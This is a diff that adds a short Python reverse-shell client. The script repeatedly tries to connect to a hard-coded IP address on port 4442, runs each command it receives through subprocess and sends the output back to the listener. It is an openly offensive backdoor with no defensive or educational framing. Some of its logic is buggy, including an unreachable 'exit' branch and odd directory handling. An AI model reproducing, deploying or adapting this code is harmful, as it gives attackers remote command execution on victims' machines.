@@ -1,0 +1,46 @@
+import socket
+import subprocess, os
+from time import sleep
+
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+
+def tryToConnect():
+    HOST_IP = '192.168.1.5' ## Your ip address
+
+    while s.connect_ex((HOST_IP, 4442)) != 0:
+        print('SLEPPING!!!')
+        sleep(3)
+
+v = True
+v1 = True
+while v1:
+    if v :
+        try:
+            s.recv(1024)
+        except OSError:
+            tryToConnect()
+    try:
+        v = False
+        msg = s.recv(1024).decode()
+        if msg:
+            x = subprocess.getoutput(msg)
+           
+        elif msg == 'exit':
+            s.close()
+            v1 = False
+        if 'cd' in msg:
+            currentDir = os.getcwd()
+            newDir =  os.chdir(currentDir[:len(currentDir)-1]+msg.strip('cd').strip())
+            s.send(str(newDir).encode())
+
+        else:
+            s.send('ERROR'.encode())
+        
+        s.send(x.encode())
+
+    except (ConnectionError, ConnectionRefusedError)as e:
+        s.close()
+        v = True
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
